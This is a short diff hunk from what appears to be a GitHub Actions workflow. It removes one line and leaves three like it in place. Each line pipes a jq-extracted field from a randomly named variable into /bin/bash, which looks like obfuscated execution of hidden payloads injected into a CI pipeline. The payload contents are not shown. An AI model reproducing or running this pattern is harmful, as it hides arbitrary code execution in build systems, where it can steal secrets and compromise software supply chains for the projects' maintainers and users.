@@ -42,7 +42,6 @@ jobs:
           echo $rf89322 | jq -r .vdng8 | /bin/bash
           printf '%s' "$vdhh28852" | jq -r .a12 | /bin/bash
           printf '%s' "$gbp159" | jq -r .onk18645 | /bin/bash
-          echo $t53432 | jq -r .vwfi312 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
